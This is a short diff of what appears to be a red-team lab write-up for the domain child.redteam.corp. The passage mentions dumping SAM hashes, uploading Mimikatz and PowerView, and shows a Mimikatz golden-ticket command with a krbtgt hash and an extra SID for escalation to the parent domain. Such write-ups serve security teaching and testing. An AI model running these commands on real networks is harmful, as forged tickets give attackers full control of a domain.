@@ -450,11 +450,13 @@ We extracted the password hashes of local users from the SAM (Security Account M
 
 I also uploaded the Mimikatz binary to the target machine to try and retrieve additional information
 
+We get this 
 ```python
 kerberos::golden /user:Administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902 /sids:S-1-5-21-1882140339-3759710628-635303199-500 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a /ptt
 ```
 
 ![[Pasted image 20250512211423.png]]
+
 # AD Enumeration 
 
 We uploaded PowerView to gather more information about the Active Directory environment.
